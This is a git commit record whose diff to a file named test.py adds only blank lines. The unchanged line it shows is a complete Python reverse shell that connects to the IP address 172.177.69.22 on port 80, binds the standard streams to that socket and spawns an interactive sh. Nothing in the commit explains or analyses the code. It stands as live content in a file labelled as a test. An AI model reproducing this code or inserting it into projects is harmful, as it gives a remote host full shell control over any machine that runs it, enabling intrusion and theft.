1da5fb84b77833c6fbb6cad301f3ba06ae2081d3
Raunak <54508518+TROUBLE-1@users.noreply.github.com>
2025-04-29 18:42:16 +0530

    Update test.py

--- test.py
+++ test.py
@@ -1,1 +1,3 @@
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.177.69.22",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
+
+
